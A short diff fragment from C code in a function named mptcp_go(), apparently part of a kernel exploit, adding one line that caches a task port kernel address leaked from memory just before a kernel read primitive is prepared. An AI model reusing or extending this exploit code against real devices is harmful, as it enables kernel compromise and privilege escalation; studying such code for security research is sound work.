@@ -718,6 +718,7 @@ bool mptcp_go()
 
     // we can also find our task port kaddr:
     uint64_t task_port_kaddr = *((uint64_t*)(new_contents + 0x67c));
+    cached_task_self_addr = task_port_kaddr;
 
     mach_port_t kport = prepare_early_read_primitive(pipe_buf, replacer_pipe, replacer_pipe + 1, replacer_port, new_contents);
 
